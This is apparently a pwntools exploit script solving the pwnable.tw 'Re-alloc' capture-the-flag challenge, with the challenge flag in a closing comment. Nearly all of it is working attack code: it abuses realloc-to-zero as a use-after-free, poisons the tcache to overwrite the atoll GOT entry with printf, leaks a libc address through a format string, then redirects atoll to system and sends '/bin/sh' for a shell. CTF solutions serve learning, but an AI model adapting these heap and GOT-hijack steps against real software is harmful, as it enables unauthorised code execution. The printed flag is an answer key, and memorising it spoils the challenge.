#!/usr/bin/env python3

from pwn import *

exe = ELF("./re-alloc_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.29.so", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10106)

    return r


def main():
    r = conn()
    def alloc(index, size, data): 
        r.sendlineafter(b'Your choice: ', b'1')
        r.sendlineafter(b'Index:', str(index).encode())
        r.sendlineafter(b'Size:', str(size).encode())
        r.sendlineafter(b'Data:', data)
    def realloc(index, size, data):
        r.sendlineafter(b'Your choice: ',b'2')
        r.sendlineafter(b'Index:', str(index).encode())
        r.sendlineafter(b'Size:', str(size).encode())
        if size != 0: 
            r.sendlineafter(b'Data:', data)

    def free(index):
        r.sendlineafter(b'Your choice: ', b'3')
        r.sendlineafter(b'Index:', str(index).encode())
    input()
    #########################
    #Stage 1: Leak libc     #
    #########################
    # Put atoll.got into 0x20 tcache for overwrite later
    alloc(0, 0x10, b'A')
    realloc(0, 0, b'\0')
    realloc(0, 0x10, p64(exe.got['atoll']))
    # pause()
    # Put out the top chunk in tcache, leave alone only atoll.got in 0x20
    alloc(1, 0x10, b'BBB')
    # After that, we reset the pointer of index 0 and index 1 of 'heap' for reuse. 
    realloc(0, 0x20, b'AAA')
    free(0)
    # pause()
    realloc(1, 0x30, b'CCCC')
    free(1)
    # pause()

    ###############################################
    # This is for poisoning 0x50 tcache with atoll#
    ###############################################
    alloc(0, 0x40, b'\0')
    realloc(0,0,b'\0')
    realloc(0,0x40, p64(exe.got['atoll']))
    # pause()
    alloc(1, 0x40, b'\0')
    realloc(0, 0x50, b'\0')
    free(0)
    realloc(1, 0x60, b'\0')
    free(1)
    pause()
    # Overwritting atoll.got
    info('printf plt: ' + hex(exe.plt['printf']))
    alloc(0, 0x40, p64(exe.plt['printf']))
    
    # alloc(0, 0x40, b'A'*8)
    # Now atoll become printf
    pause()
    # Leak libc
    free(exe.got['printf'])
    r.recv(8)
    libc_leak = u64(r.recv(6) + b'\0\0')
    libc.address = libc_leak - 0x83e4a
    info('Libc leak: ' + hex(libc_leak))
    info('Libc address: ' + hex(libc.address))
    system = libc.sym['system']
    info('Libc system: ' + hex(system))
    ############################
    # Stage 2: Get shell       #
    ############################
    # Because index 0x50 of tcache has been corrupted, we need to find another index to overwrite atoll to system. 
    # But i forgot that because choice 3 (rfree()) cannot be used anymore, so i must put atoll got before, in stage 1.
    # pause()

    r.sendlineafter(b'Your choice: ', b'1')
    r.sendlineafter(b'Index:', b'')
    r.sendlineafter(b'Size:', b'AAAAAAAA')
    r.sendlineafter(b'Data:', p64(system))
    pause()
    # Trigger shell
    r.sendlineafter(b'Your choice: ', b'1')
    r.sendlineafter(b'Index:', b'/bin/sh')
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
# FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}